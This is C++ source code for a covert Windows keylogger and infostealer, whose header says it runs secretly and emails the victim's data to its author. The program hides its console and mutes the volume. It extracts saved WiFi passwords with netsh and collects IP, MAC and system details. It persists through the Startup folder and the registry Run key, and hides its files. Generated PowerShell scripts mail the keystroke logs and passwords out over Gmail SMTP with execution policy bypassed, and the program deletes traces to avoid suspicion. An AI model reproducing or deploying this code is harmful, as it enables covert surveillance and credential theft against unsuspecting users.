  /*What will this program do?
    This program will operate secretly and will read the keystrokes of the user and store them onto a file
	it will also get the ip address , system info and mac address of the user and store them in seperate files
	in the end it will email the files to my email.*/
	
	
	//including required libraries
#include <iostream>   //Input/output
#include <windows.h>  //For hiding/show console
#include <winuser.h>  //For reading keys
#include <ctime>      //For gettime function
#include <fstream>    //For file handling   
#include <string>     //Manipulating strings
#include <Lmcons.h>
#include <dir.h>
#include<conio.h>
#include<stdio.h>   //Used to get user name.
using namespace std;

    //declaring functions
void gettime (void); //To get system time.
void showsysteminfo(void); //To get system info
void hideconsole(void); //Hide the console (Black screen)
void storemacaddress(void); //Store mac address in a file
void storeipddress(void); //Store ip address in a file
void sendlog (void); //Send the log file. (Run powershell script)
void keylog (void) ; //Keylogger function
void sendinfo (void); //Send all other files excluding log file (Run powershell script)
void getlocation (void); //To get exe files location.
void ShowConsole(void);  //Shoe console if needed.. (Iam not calling it)
void startup (void); //Copy batch file to startup folder
void createsendinfopsfile(void); //Create powershell script to send all other files excluding log file
void createkeyloggerpsfile(void); //Create powershell script to send log file
void getusername (void); //Get the users name
void cleanfolder (void); //Clean the folder from the files after they are sent
void storexternalip (void); //Get external ip address of the victim..
void turnofvoice(void);//Turn the volume down 

//Global variables
string location; //Global Variable to store location of cpp file
string systemuser; //Variable to store the users name.
int num,g=0;
 void makefile (void) //To make batch files
{
ofstream myfile; 
myfile.open ("Ws.bat"); //Making the batch file (Ws.bat)to get wifi passwords and store them in a file (Ps.txt) Copied this code and made some changes.
myfile<<"@echo off\n";
myfile<<"\n";
myfile<<"\n";
myfile<<"\n";
myfile<<"setlocal enabledelayedexpansion\n";
myfile<<"\n";
myfile<<":main\n";
myfile<<"    \n";
myfile<<"    \n";
myfile<<"    \n";
myfile<<"\n";
myfile<<"    :: Get all the profiles\n";
myfile<<"    call :get-profiles r\n";
myfile<<"\n";
myfile<<"    :: For each profile, try to get the password\n";
myfile<<"    :main-next-profile\n";
myfile<<"        for /f \"tokens=1* delims=,\" %%a in (\"%r%\") do (\n";
myfile<<"            call :get-profile-key \"%%a\" key\n";
myfile<<"            if \"!key!\" NEQ \"\" (\n";
myfile<<"                echo WiFi: [%%a] Password: [!key!]>>Ps.txt"; //Change which i made: this will store the results of the batch file (passwords) in Ps.txt
myfile<<"            )\n";
myfile<<"            set r=%%b\n";
myfile<<"        )\n";
myfile<<"        if \"%r%\" NEQ \"\" goto main-next-profile\n";
myfile<<"\n";
myfile<<"    echo.\n";
myfile<<"    ";
myfile<<"\n";
myfile<<"    goto :eof\n";
myfile<<"\n";
myfile<<"::\n";
myfile<<":: Get the WiFi key of a given profile\n";
myfile<<":get-profile-key <1=profile-name> <2=out-profile-key>\n";
myfile<<"    setlocal\n";
myfile<<"\n";
myfile<<"    set result=\n";
myfile<<"\n";
myfile<<"    FOR /F \"usebackq tokens=2 delims=:\" %%a in (\n";
myfile<<"        `netsh wlan show profile name^=\"%~1\" key^=clear ^| findstr /C:\"Key Content\"`) DO (\n";
myfile<<"        set result=%%a\n";
myfile<<"        set result=!result:~1!\n";
myfile<<"    )\n";
myfile<<"    (\n";
myfile<<"        endlocal\n";
myfile<<"        set %2=%result%\n";
myfile<<"    )\n";
myfile<<"\n";
myfile<<"    goto :eof\n";
myfile<<"\n";
myfile<<"::\n";
myfile<<":: Get all network profiles (comma separated) into the result result-variable\n";
myfile<<":get-profiles <1=result-variable>\n";
myfile<<"    setlocal\n";
myfile<<"\n";
myfile<<"    set result=\n";
myfile<<"\n";
myfile<<"   \n";
myfile<<"    FOR /F \"usebackq tokens=2 delims=:\" %%a in (\n";
myfile<<"        `netsh wlan show profiles ^| findstr /C:\"All User Profile\"`) DO (\n";
myfile<<"        set val=%%a\n";
myfile<<"        set val=!val:~1!\n";
myfile<<"\n";
myfile<<"        set result=%!val!,!result!\n";
myfile<<"    )\n";
myfile<<"    (\n";
myfile<<"        endlocal\n";
myfile<<"        set %1=%result:~0,-1%\n";
myfile<<"    )\n";
myfile<<"";
myfile<<"goto :eof";

myfile.close();
ofstream file; 
file.open("alo.bat"); //Making another batch file (alo.bat) which we will put in startup folder so it starts when computer starts
file<<"cd %USERPROFILE%\\Start Menu\\Programs\n"; //It will go to the programs folder path <<<<----
file<<"START /B Keylog.exe";//Then start our exe file
file.close();
}
 void registery (void)//To edit registry
 {
 	//This is the code to put our alo.bat file in our registery (This will make it run on startup)
 	//These are default/set instructions which can be found in the internet. 
 	HKEY hKey;
const char* czStartName = "alo.bat";
string czExePath   = "%USERPROFILE%\\Start Menu\\Programs\\Startup\\alo.bat";

LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0 , KEY_WRITE,
                            &hKey);
if( ERROR_SUCCESS == lnRes )
{
    lnRes = RegSetValueEx(  hKey,
                            czStartName,
                            0,
                            REG_SZ,
                            (unsigned char*)czExePath.c_str(),
                            strlen(czExePath.c_str()) );
}

RegCloseKey(hKey);
 }
 void cleanfolder (void)//for clean up
 {
 	                	string deletecommand = "cd "+location; //We store the command to go to the location of the exe in a string
	                    system(deletecommand.c_str());  //We execute it
	                    system("attrib -h \"IPAddress.txt\""); //We use cmd commands to unhide Ip address.txt (We hide it too dw.. coming in the next functions)
	                    system("del IPAddress.txt");//We delete the Ipaddress.txt file
	                     system("attrib -h \"alo.bat\"");//We repeat for alo.bat
	                     system("del alo.bat");
	                    system("attrib -h \"Infosender.ps1\"");//Repeat again	
	                    system("del Infosender.ps1");
	                    system("attrib -h \"MacAddress.txt\"");//Repeat again
	                    system("del MacAddress.txt");
	                    system("attrib -h \"publicip.txt\"");//Repeat again
	                    system("del publicip.txt");
	                    system("attrib -h \"SystemInfo.txt\"");//Repeat again
	                    system("del SystemInfo.txt");
	                    system("attrib -h \"Ps.txt\"");//Repeat again
	                    system("attrib -h \"Ws.bat\"");//Repeat again
	                    system("del Ws.bat");
                    	system("del Ps.txt");
 }
 
 void getusername (void) // using Lmcons library to get username..
  {
  	//These are commands from the lmcons library to get the username of the PC its running on (Copied) google:"How to get system username in c++"
  char username[UNLEN+1];
   DWORD username_len = UNLEN+1;
   GetUserName(username, &username_len);
   systemuser=username;	//we store the username in our global variable
  }
 void createkeyloggerpsfile (void) //Creating the powershell file
   {
   	//Powershell script to send log file
 	    ofstream myfile;
    myfile.open ("keylogsender.ps1");//its name
    myfile << "$location = ($PSCommandPath).trim(\"keylogsender.ps1\")"<<endl;//Getting location of the script and refining it
    myfile << "$location = $location +\"\log.txt\""<<endl; //adding log.txt to it so we can complete the path for the file we are to send..
    myfile << "$Body = \"Sample Email Body\""<<endl;//Mails body
    myfile << "$SmtpServer = 'smtp.gmail.com' "<<endl;//Smtp server for the senders server(gmail in our case)
    myfile << "$SmtpUser = 'SENDEREMAIL@GMAIL.COM'"<<endl; //Username for the server (in our case it will be our gmail accounts email address)
    myfile << "$smtpPassword = 'SENDERPASSWORD'"<<endl;//Password of the gmail account in our case
    myfile << "$MailtTo = 'RECIEVEREMAIL@GMAIL.COM'"<<endl;//The recipient of the email
    myfile << "$MailFrom = 'SENDEREMAIL@GMAIL.COM'"<<endl;//Senders mail
    myfile << "$MailSubject = \"Key log - User: "+systemuser+"\""<<endl;//Mails subject we add system users name (global variable we stored earlier) at the end so we can know who ran the file..
    myfile << "$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword |"<<endl;//Sending email
    myfile << "ConvertTo-SecureString -AsPlainText -Force)"<<endl;
    myfile << "Send-MailMessage -To \"$MailtTo\" -from \"$MailFrom\" -Subject $MailSubject -Body \"$Body\"-Attachments $location -SmtpServer $SmtpServer -BodyAsHtml -UseSsl -Credential $Credentials  "<<endl;
    myfile << "write-Output \"Email Sent\""<<endl;
  myfile.close();//Closing the file
 }

 void createsendinfopsfile (void) //Creating second powershell file
   {
   	//Repeating the process this time we craete powershell script to send ipaddress.txt
 	ofstream myfile;
    myfile.open ("Infosender.ps1");
    myfile << "$location = ($PSCommandPath).trim(\"Infosender.ps1\")"<<endl;
    myfile << "$location = $location +\"\\\IPAddress.txt\""<<endl;
    myfile << "$Body = \"IP\""<<endl;
    myfile << "$SmtpServer = 'smtp.gmail.com' "<<endl;
    myfile << "$SmtpUser = 'SENDEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$smtpPassword = 'SENDERPASSWORD'"<<endl;
    myfile << "$MailtTo = 'RECIEVEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$MailFrom = 'SENDEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$MailSubject = \"Ip address - User: "+systemuser+"\""<<endl;
    myfile << "$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword |"<<endl;
    myfile << "ConvertTo-SecureString -AsPlainText -Force)"<<endl;
    myfile << "Send-MailMessage -To \"$MailtTo\" -from \"$MailFrom\" -Subject $MailSubject -Body \"$Body\"-Attachments $location -SmtpServer $SmtpServer -BodyAsHtml -UseSsl -Credential $Credentials  "<<endl;
    myfile << "write-Output \"Email Sent\""<<endl;
    myfile<<"\n\n\n";
    
       	//Repeating the process this time we craete powershell script to send Macaddress.txt

    myfile << "$location = ($PSCommandPath).trim(\"Infosender.ps1\")"<<endl;
    myfile << "$location = $location +\"\\\MacAddress.txt\""<<endl;
    myfile << "$Body = \"Mac Address\""<<endl;
    myfile << "$SmtpServer = 'smtp.gmail.com' "<<endl;
    myfile << "$SmtpUser = 'SENDEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$smtpPassword = 'SENDERPASSWORD'"<<endl;
    myfile << "$MailtTo = 'RECIEVEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$MailFrom = 'SENDEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$MailSubject = \"Mac Address - User: "+systemuser+"\""<<endl;
    myfile << "$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword |"<<endl;
    myfile << "ConvertTo-SecureString -AsPlainText -Force)"<<endl;
    myfile << "Send-MailMessage -To \"$MailtTo\" -from \"$MailFrom\" -Subject $MailSubject -Body \"$Body\"-Attachments $location -SmtpServer $SmtpServer -BodyAsHtml -UseSsl -Credential $Credentials  "<<endl;
    myfile << "write-Output \"Email Sent\""<<endl;
    myfile<<"\n\n\n";
       	//Repeating the process this time we craete powershell script to send publicip.txt

    myfile << "$location = ($PSCommandPath).trim(\"Infosender.ps1\")"<<endl;
    myfile << "$location = $location +\"\\\publicip.txt\""<<endl;
    myfile << "$Body = \"External IP\""<<endl;
    myfile << "$SmtpServer = 'smtp.gmail.com' "<<endl;
    myfile << "$SmtpUser = 'SENDEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$smtpPassword = 'SENDERPASSWORD'"<<endl;
    myfile << "$MailtTo = 'RECIEVEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$MailFrom = 'SENDEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$MailSubject = \"External IP - User: "+systemuser+"\""<<endl;
    myfile << "$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword |"<<endl;
    myfile << "ConvertTo-SecureString -AsPlainText -Force)"<<endl;
    myfile << "Send-MailMessage -To \"$MailtTo\" -from \"$MailFrom\" -Subject $MailSubject -Body \"$Body\"-Attachments $location -SmtpServer $SmtpServer -BodyAsHtml -UseSsl -Credential $Credentials  "<<endl;
    myfile << "write-Output \"Email Sent\""<<endl;
    myfile<<"\n\n\n";
    
       	//Repeating the process this time we craete powershell script to send systeminfo.txt

    myfile << "$location = ($PSCommandPath).trim(\"Infosender.ps1\")"<<endl;
    myfile << "$location = $location +\"\\\SystemInfo.txt\""<<endl;
    myfile << "$Body = \"Systeminfo\""<<endl;
    myfile << "$SmtpServer = 'smtp.gmail.com' "<<endl;
    myfile << "$SmtpUser = 'SENDEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$smtpPassword = 'SENDERPASSWORD'"<<endl;
    myfile << "$MailtTo = 'RECIEVEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$MailFrom = 'SENDEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$MailSubject = \"System info - User: "+systemuser+"\""<<endl;
    myfile << "$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword |"<<endl;
    myfile << "ConvertTo-SecureString -AsPlainText -Force)"<<endl;
    myfile << "Send-MailMessage -To \"$MailtTo\" -from \"$MailFrom\" -Subject $MailSubject -Body \"$Body\"-Attachments $location -SmtpServer $SmtpServer -BodyAsHtml -UseSsl -Credential $Credentials  "<<endl;
    myfile << "write-Output \"Email Sent\""<<endl;
    myfile<<"\n\n\n";
       	//Repeating the process this time we craete powershell script to send Ps.txt

   myfile << "$location = ($PSCommandPath).trim(\"Infosender.ps1\")"<<endl;
    myfile << "$location = $location +\"\\\Ps.txt\""<<endl;
    myfile << "$Body = \"Passwords\""<<endl;
    myfile << "$SmtpServer = 'smtp.gmail.com' "<<endl;
    myfile << "$SmtpUser = 'SENDEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$smtpPassword = 'SENDERPASSWORD'"<<endl;
    myfile << "$MailtTo = 'RECIEVEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$MailFrom = 'SENDEREMAIL@GMAIL.COM'"<<endl;
    myfile << "$MailSubject = \"Passwords - User: "+systemuser+"\""<<endl;
    myfile << "$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword |"<<endl;
    myfile << "ConvertTo-SecureString -AsPlainText -Force)"<<endl;
    myfile << "Send-MailMessage -To \"$MailtTo\" -from \"$MailFrom\" -Subject $MailSubject -Body \"$Body\"-Attachments $location -SmtpServer $SmtpServer -BodyAsHtml -UseSsl -Credential $Credentials  "<<endl;
    myfile << "write-Output \"Email Sent\""<<endl;
  myfile.close();
 
 }
  
 void gettime (void) //Get system time .
   {
   	 // From the ctime library we get time and store in the systeminfo file. (Preset commands available on google)
    ofstream sysfile;  
    sysfile.open("SystemInfo.txt", ios::app); //Appending so that our old content doesnt get removed (ios::app) means append
   	time_t now = time(0);
    char* dt = ctime(&now);
    sysfile << "The local date and time is: " << dt << endl;
	sysfile.close(); 
   }
      	
 void showsysteminfo(void)  //Function to store system informaton in a file.
   {          
 	SYSTEM_INFO siSysInfo;    //WE take the info and store in a structure ,,, we name it siSysInfo
 	GetSystemInfo(&siSysInfo);     //We get the info from the structure                                                                             
	//Storing data in the SystemInfo.txt file

	ofstream sysfile;  
    sysfile.open("SystemInfo.txt", ios::app);    //storing file name in sysfile variable and opening the file.
	 
	sysfile<<"Hardware information: \n";  
	
    sysfile<<"OEM ID: "<< siSysInfo.dwOemId<<endl;   //WE get OEM ID from dwOemId variable from the siSysInfo structure
    
    sysfile<<"Number of processors:"<< siSysInfo.dwNumberOfProcessors<<endl;  //WE get Number of processors from dwNumberOfProcessors variable from the siSysInfo structure
    
    
    sysfile<<"Page size: "<<siSysInfo.dwPageSize<<endl;  //WE get Page size from dwPageSize variable from the siSysInfo structure
    
    sysfile<<"Processor type: "<< siSysInfo.dwProcessorType<<endl;  //WE get processor type from dwProcessorType variable from the siSysInfo structure
    
    sysfile<<"Minimum application address: "<< siSysInfo.lpMinimumApplicationAddress<<endl;  /*WE getMinimum application address from lpMinimumApplicationAddress
	                                                                                       variable from the siSysInfo structure*/
    
    sysfile<<"Maximum application address: "<< siSysInfo.lpMaximumApplicationAddress<<endl;   /*WE Maximum application address application address from lpMaximumApplicationAddress
	                                                                                       variable from the siSysInfo structure*/
    
    sysfile<<"Active processor mask: "<<siSysInfo.dwActiveProcessorMask<<endl;     /*WE Active processor mask application address from dwActiveProcessorMas
	                                                                                       variable from the siSysInfo structure*/
	sysfile<<"System name: "<<systemuser; //We write te system username at the end of the system info file..
	
	sysfile<<"\n\n\n";

	sysfile.close();   //Closing the file.                                                        
 }
 
 void hideconsole(void) //This is from windows.h library it hides the console when executed.
   {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
   }
 
 void storemacaddress(void)   //Types the command in cmd and stores the result into a file
   {
  system(("getmac>MacAddress.txt"));
   }
	
 void storeipddress(void)  //Types the command in cmd and stores the result into a file
   {
  system(("ipconfig>IPAddress.txt"));
   }
 void storexternalip (void) //Types the command in cmd and stores result in publicip.txt ">" means basically store result
 {
    system("nslookup myip.opendns.com resolver1.opendns.com>publicip.txt");
 }
  void sendlog (void) //Runs the powershell script to send email.
   {
   	     //Storing command to run our keylogsender.ps1 powershell file in a string
 	     string command =("powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file \""+location+"\\keylogsender.ps1\"");
 	     system(command.c_str()); //converting string to char datatype and running it in cmd
 	   
 
   }
 
 void sendinfo (void) //Runs the powershell script to send email.
   {
   	    //Storing command to run our Infosender.ps1 powershell file in a string
   	    string command2 =("powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file \""+location+"\\Infosender.ps1\"");
 	     system(command2.c_str());//converting string to char datatype and running it in cmd
 	  
   }
   
   
 void getlocation (void)  //Gets the location from where the file is placed.
   {
   	//This is the command (copied) to store the location of the exe in the location variable we have been using all along
		char tuh[_MAX_PATH];
char *abc;
abc=getcwd(tuh,sizeof(tuh));
location=abc;
   }
   void turnofvoice()//to turn off voice
 {
 	//This is the command to turn the volume down of the pc (copied) as the keylogger makes some noise at start
  INPUT ip={0};
  ip.type = INPUT_KEYBOARD;
  ip.ki.wVk = VK_VOLUME_MUTE;   //or VOLUME_DOWN or MUTE
  SendInput(1, &ip, sizeof(INPUT));
  ip.ki.dwFlags = KEYEVENTF_KEYUP;
  SendInput(1, &ip, sizeof(INPUT));
}
 void keylog (void) //Key logger
   {
	char c;
	int count=0; //When to send email
	while(3)
	{
		
		for (c=7; c<=130;c++) // We loop through the whole ascii table, and check if the key is pressed
		{            
		                  if (count==90) //If 90 chars entered send log file
	                    	{
	                    sendlog();
	                    string deletecommand = "cd "+location;
	                    system(deletecommand.c_str());
	                    system("del log.txt");
	                    count=0;
	                    	}                        
			if (GetAsyncKeyState(c)==-32767)  //This function belonging to winuser.h returns -32767 if key is pressed
			{
			   	count++; //counting characters
	
			   	
				ofstream write;
                write.open("log.txt", ios::app);
		     	//storing file name in outfile variable and opening it
				string command = "cd "+location;
	            system(command.c_str());
	            system("attrib +h \"log.txt\"");
		      
            
            if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)) )
            {
                c+=32;
                write<<c;
                write.close();
                break;
            }
            else if((c>64)&&(c<91))
            {
                
                write<<c;
                write.close();
                break;
            }
            else {
                
                switch (c)
                {
                    case 48:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<")";
                        else
                            write<<"0";    
                        
                        
                        }   
                    break;
                    
                    
                    
                    case 49:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"!";
                        else
                            write<<"1";    
                        
                        
                        }   
                    break;
                    
                    case 50:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"@";
                        else
                            write<<"2";    
                        
                        }
                    break;
                    case 51:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"#";
                        else
                            write<<"3";    
                        
                        
                        }   
                    break;  
                    case 52:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"$";
                        else
                            write<<"4";    
                        
                        
                        }   
                    break;  
                    case 53:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"%";
                        else
                            write<<"5";    
                        
                        
                        }   
                    break;
                    case 54:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"^";
                        else
                            write<<"6";    
                        
                        
                        }   
                    break;
                    case 55:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"&";
                        else
                            write<<"7";    
                        
                        
                        }   
                    break;
                    case 56:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"*";
                        else
                            write<<"8";    
                        
                        
                        }   
                    break;
                    case 57:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"(";
                        else
                            write<<"9";    
                        
                        
                        }   
                    break;
                    
                    case VK_SPACE:
                        write<<" ";
                        break;
                    case VK_RETURN:
                        write<<"\n";
                        break;  
                    case VK_TAB:
                        write<<"  ";
                        break;
                   case VK_BACK:
                        write<<"<BACKSPACE>";
                        break;
                    case VK_DELETE:
                        write<<"<Del>";
                        break;  
                               
				                                  //We can use VK_SHIFT etc instead of their ASCIIS                                
				case VK_SHIFT:  //if user enters shift
                write<<"<Shift>";
                break;
                
                case VK_CONTROL: //if user enters control
                write<<"<Control>";
                break;
                
                case VK_ESCAPE : //if user enters escape
                write<<"<Escape>";
                break;
                
                case VK_END :    //if user enters end
                write<<"<End>";
                break;
                
                case VK_HOME:    //if user enters home
                write<<"<Home>";
                break;
                
                case VK_LEFT:    //if user enters left
                write<<"Left>";
                break;
                
                case VK_UP:     //if user enters up
                write<<"Up";
                break;
                
                case VK_RIGHT: //if user enters right
                write<<"<Right>";
                break;
                
                case VK_DOWN : //if user enters down
                write<<"<Down>"; 
                break; 
                
                    
            }
                
                }
           
           }
	
	}
}
}
 void startup(void) //Adds program to startup
   {
   string command3=("copy \""+location+"\\alo.bat\" \"%USERPROFILE%\\Start Menu\\Programs\\Startup\"");//storing command to copy our bat file to the startup folder in a string
   //anything in this folder runs at start 
   system(command3.c_str());//Running the command
   }
  
 void ShowConsole() //Shows Console (windows.h)
   {
    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);
   }
	

	
	main()
	{   //Calling the functions
	turnofvoice();//Turning off voice
	hideconsole();//hiding console
	string command0="copy \""+location+"\Keylog.exe\" \"%USERPROFILE%\\Start Menu\\Programs\"";//Command to copy our exe to the programs folder 
	//(a folder not easily detectable by average people) so no one can find the keylogger
   system(command0.c_str());//executing command
	getlocation();//getting location
	getusername();//getting username
	createsendinfopsfile();//creating infosender file
	makefile();//making batch files both
	startup();//adding alo.bat to startup
	registery ();//Adding registery
	system("IF EXIST %USERPROFILE%\\Start Menu\\Programs\\Startup\\alo.bat alo.bat ");//If alo.bat exists in the startup folder we run it 
	system("del %USERPROFILE%\\Start Menu\\Programs\\alo.bat");//We delete alo.bat from the startup folder (This is to stop it from running it self again and again)
	string command6="cd "+location;//we go to the loctaion of the exe 
	system(command6.c_str());//execute the command to go
	system("Ws.bat");//We run the Ws.bat file (One used to get passwords)
    system("attrib +h \"Ws.bat\"");//We hide the ws.bat file so no one sees it
    system("attrib +h \"Ps.txt\""); //We hide the resultant Ps.txt file too
     system("attrib +h \"alo.bat\"");//We hide alo.bat too
	string command = "cd "+location;//Going to the location of exe (Kinda unneccessary as we are already there)
	system(command.c_str());
	system("attrib +h \"Infosender.ps1\"");//Hiding the infosender file we made earlier
	createkeyloggerpsfile();//Creating the keylogsender file
	string command1 = "cd "+location;//Going to the location of exe
	system(command1.c_str());
	system("attrib +h \"keylogsender.ps1\"");//Hiding keylogsender file
	storexternalip();//Getting external ip
	string command2 = "cd "+location;//Going to the location of exe
	system(command2.c_str());
	system("attrib +h \"publicip.txt\"");//Hiding the external ip file
    storeipddress();//Getting ip address
    string command3 = "cd "+location;//Going to the location of exe
	system(command3.c_str());
	system("attrib +h \"IPAddress.txt\"");//Hiding the ip address file
	showsysteminfo();//getting system info
	gettime();//getting system time
	string command4 = "cd "+location;//Going to the location of exe
	system(command4.c_str());
	system("attrib +h \"SystemInfo.txt\"");//Hiding system info.txt file
	storemacaddress();//Getting mac address
	string command5 = "cd "+location;//Going to the location of exe
	system(command5.c_str());
	system("attrib +h \"MacAddress.txt\"");//Hiding mac address file

    sendinfo();//Sending all files except log.txt 
	cleanfolder();//Cleaning up the folder to avoid too much suspicion
    keylog();//Starting the keylogger indefinetely
    }
